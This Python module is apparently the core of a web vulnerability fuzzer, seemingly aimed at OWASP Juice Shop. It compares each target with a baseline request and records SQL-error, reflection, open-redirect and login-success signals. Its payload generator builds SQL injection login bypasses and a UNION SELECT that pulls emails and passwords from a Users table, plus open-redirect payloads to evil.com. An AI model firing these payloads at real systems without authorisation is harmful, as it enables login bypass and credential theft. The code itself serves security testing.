# backend/modules/fuzzer_core.py
from __future__ import annotations
import json, time, hashlib
from pathlib import Path
from typing import Dict, Any, List, Tuple, Optional
from urllib.parse import urlparse, urlencode, urlunparse, parse_qs

import httpx
from .detectors import reflection_signals, sql_error_signal, score

TRUNCATE_BODY = 2048

def _hash(s: str) -> str:
    return hashlib.sha1(s.encode("utf-8", "ignore")).hexdigest()

def _lower_headers(h: Dict[str, str]) -> Dict[str, str]:
    try:
        return {k.lower(): v for k, v in dict(h).items()}
    except Exception:
        # httpx Headers can be multi-dict; fallback
        out = {}
        for k in h.keys():
            out[k.lower()] = h.get(k)
        return out

def _apply_payload_to_target(t: Dict[str, Any], payload: str, control: bool=False) -> Tuple[str, Dict[str,str], Optional[str]]:
    """
    Build a concrete HTTP request for target `t` and `payload`.
    Returns (url, headers, body)
    """
    url = t["url"]
    headers = dict(t.get("headers") or {})
    body = t.get("body")

    value = t["control_value"] if control else payload
    target_param = t["target_param"]

    if t["in"] == "query":
        # Replace only the target param; keep others as-is
        u = urlparse(url)
        q = parse_qs(u.query, keep_blank_values=True)
        q[target_param] = [value]
        new_qs = urlencode(
            [(k, v) for k, vs in q.items()
             for v in (vs if isinstance(vs, list) else [vs])]
        )
        url = urlunparse((u.scheme, u.netloc, u.path, u.params, new_qs, u.fragment))
        body = None  # GET
    else:
        # Body parameter
        ctype = (t.get("content_type") or "").split(";")[0].strip().lower()
        if ctype == "application/json":
            try:
                data = json.loads(body) if isinstance(body, str) else (body or {})
                if not isinstance(data, dict):
                    data = {}
            except Exception:
                data = {}
            data[target_param] = value
            body = json.dumps(data)
            headers["Content-Type"] = "application/json"
        else:
            # form-urlencoded or unknown -> urlencoded
            p = parse_qs(body or "", keep_blank_values=True)
            p[target_param] = [value]
            body = urlencode(
                [(k, v) for k, vs in p.items()
                 for v in (vs if isinstance(vs, list) else [vs])]
            )
            headers["Content-Type"] = "application/x-www-form-urlencoded"

    return url, headers, body

def _send(client: httpx.Client, method: str, url: str, headers: Dict[str,str], body: Optional[str], timeout: float):
    try:
        if method.upper() == "GET":
            r = client.get(url, headers=headers, timeout=timeout)
        else:
            content = body.encode("utf-8") if isinstance(body, str) else body
            r = client.request(method.upper(), url, headers=headers, content=content, timeout=timeout)
        return r
    except Exception:
        return None

def _origin_host(url: str) -> str:
    try:
        return urlparse(url).netloc.lower()
    except Exception:
        return ""

def _open_redirect_signal(resp: httpx.Response, origin_host: str) -> Dict[str, Any]:
    """
    Detect server-side redirects to external hosts via Location header.
    Only meaningful when follow_redirects=False.
    """
    s = resp.status_code or 0
    loc = resp.headers.get("Location") or resp.headers.get("location")
    if not loc:
        return {"open_redirect": False}
    try:
        host = urlparse(loc).netloc.lower()
    except Exception:
        host = ""
    external = bool(host and host != origin_host)
    is_redirect = s in (301, 302, 303, 307, 308)
    return {
        "open_redirect": bool(loc and is_redirect and external),
        "status": s,
        "location": loc,
        "location_host": host,
        "external": external,
    }

def _login_success_oracle(resp: httpx.Response) -> Dict[str, Any]:
    """
    Heuristic: Juice Shop & typical APIs return token in JSON, or set-cookie on success.
    """
    ok = False
    reason = []
    j = {}
    try:
        if "application/json" in (resp.headers.get("content-type","").lower()):
            j = resp.json()
    except Exception:
        j = {}
    # token patterns
    token = None
    if isinstance(j, dict):
        if "authentication" in j and isinstance(j["authentication"], dict) and "token" in j["authentication"]:
            token = j["authentication"]["token"]
        elif "token" in j:
            token = j.get("token")
    if token:
        ok = True
        reason.append("json_token")
    # cookie
    if any(h.lower()=="set-cookie" for h in resp.headers.keys()):
        ok = True
        reason.append("set_cookie")
    return {"login_success": ok, "reasons": reason, "token_present": bool(token)}

def _generate_context_aware_payloads(t: Dict[str, Any]) -> List[str]:
    """
    Merge user-provided payloads with minimal context-aware probes so
    we can trigger real oracles without depending on pre-curated lists.
    """
    base = list(dict.fromkeys((t.get("payloads") or [])))  # dedupe, keep order
    auto: List[str] = []
    param = (t.get("target_param") or "").lower()
    url = t.get("url") or ""
    location = t.get("in")

    # JSON login bypass (typical)
    ctype = (t.get("content_type") or "").split(";")[0].strip().lower()
    looks_like_login = ("login" in url.lower()) or (param in ("email","username","user","login"))
    if ctype == "application/json" and looks_like_login and location != "query":
        auto += [
            "' OR '1'='1' -- ",
            "' OR '1'='2' -- "
        ]

    # Basic SQL error / boolean probes for search-like params
    if location == "query" and param in ("q","query","search","s"):
        auto += [
            "'",                    # error probe
            "') AND 1=1--",
            "') AND 1=2--",
        ]
        # Opportunistic UNION (Juice Shop-like); safe to try and downscore if noise
        auto += [
            # user supplied example often works in Juice Shop
            "qwert')) UNION SELECT id, email, password, '4','5','6','7','8','9' FROM Users--"
        ]

    # Open-redirect probes for to/url/next parameters (your existing set can still live in t['payloads'])
    if location == "query" and param in ("to","url","next","redirect","return","continue"):
        auto += [
            "http://evil.com",
            "https://evil.com",
            "//evil.com",
            "https:////evil.com",
            "http://evil.com@allowed.com",
            "https://allowed.com@evil.com",
            "%2f%2fevil.com"
        ]

    # Deduplicate but preserve order: base first, then auto, without repeats
    seen = set()
    out: List[str] = []
    for p in base + auto:
        if p not in seen:
            out.append(p); seen.add(p)
    return out

def run_fuzz(job_dir: Path, targets_path: Path, out_dir: Optional[Path] = None) -> Path:
    """
    Executes control vs injected requests for each target param.
    Writes evidence to <job_dir>/results/evidence.jsonl
    """
    targets_obj = json.loads(targets_path.read_text("utf-8"))
    targets: List[Dict[str, Any]] = targets_obj.get("targets", [])

    results_dir = (out_dir or job_dir / "results")
    results_dir.mkdir(parents=True, exist_ok=True)
    evidence_path = results_dir / "evidence.jsonl"

    # We want 3xx Location for open-redirect detection -> don't auto-follow
    with httpx.Client(follow_redirects=False) as client, evidence_path.open("w", encoding="utf-8") as fout:
        for t in targets:
            method = t["method"].upper()
            timeout = float(t.get("timeout", 12.0))

            # CONTROL (baseline)
            u_ctrl, h_ctrl, b_ctrl = _apply_payload_to_target(t, t["control_value"], control=True)
            t0 = time.time(); r0 = _send(client, method, u_ctrl, h_ctrl, b_ctrl, timeout); t1 = time.time()
            if not r0:
                continue
            body0 = (r0.text or "")[:TRUNCATE_BODY]
            s0, l0 = r0.status_code, len(body0)

            origin = _origin_host(t["url"] or "")

            # TEST PAYLOADS
            payloads = _generate_context_aware_payloads(t)
            for payload in payloads:
                u1, h1, b1 = _apply_payload_to_target(t, payload, control=False)

                t2 = time.time(); r1 = _send(client, method, u1, h1, b1, timeout); t3 = time.time()
                if not r1:
                    continue

                # Bodies & headers
                body1_full = r1.text or ""
                body1 = body1_full[:TRUNCATE_BODY]
                resp_headers = _lower_headers(r1.headers)

                # Signals
                refl = reflection_signals(body1_full, payload)
                sqlerr = sql_error_signal(body1_full)
                redir = _open_redirect_signal(r1, origin)
                login_oracle = _login_success_oracle(r1)

                # Deltas
                status_delta = abs((r1.status_code or 0) - s0)
                len_delta = abs(len(body1) - l0)
                ms_delta = int((t3 - t2 - (t1 - t0)) * 1000)

                # Confidence (base)
                conf = score({"reflection": refl, "sql_error": sqlerr}, status_delta, len_delta, ms_delta)
                # Strong oracles bump
                if redir.get("open_redirect"):
                    conf = max(conf, 0.95)
                if login_oracle.get("login_success"):
                    conf = max(conf, 0.95)

                should_record = (
                    conf >= 0.6
                    or sqlerr
                    or refl.get("js_context")
                    or refl.get("raw")
                    or redir.get("open_redirect")
                    or login_oracle.get("login_success")
                )

                if should_record:
                    # Back-compatible top-level (so your UI keeps working)
                    ev_top = {
                        "job": job_dir.name,
                        "target_id": t["id"],
                        "method": method,
                        "in": t["in"],
                        "param": t["target_param"],
                        "url": t["url"],  # original target URL
                        "content_type": t.get("content_type"),
                        "payload": payload,
                        "control_value": t["control_value"],
                        "status": r1.status_code,
                        "status_delta": status_delta,
                        "len_delta": len_delta,
                        "latency_ms_delta": ms_delta,
                        "signals": {
                            "reflection": refl,
                            "sql_error": sqlerr,
                            "open_redirect": redir,
                            "login": login_oracle,
                        },
                        "confidence": conf,
                        "response_hash": _hash(body1),
                        "response_snippet": body1,
                    }

                    # Normalized request/response block (new; safer for triage & verify)
                    ev_norm = {
                        "request": {
                            "method": method,
                            "url": u1,                  # the actual mutated URL we sent
                            "param": t["target_param"],
                            "headers": h1,
                            "body": b1,
                        },
                        "response": {
                            "status": r1.status_code,
                            "length": len(body1_full),
                            "elapsed_ms": int((t3 - t2) * 1000),
                            "headers": {
                                # keep a small, useful subset
                                "content-type": resp_headers.get("content-type"),
                                "location": resp_headers.get("location"),
                                "set-cookie": resp_headers.get("set-cookie"),
                            },
                        }
                    }

                    ev = {**ev_top, **ev_norm}
                    fout.write(json.dumps(ev) + "\n")

    return evidence_path
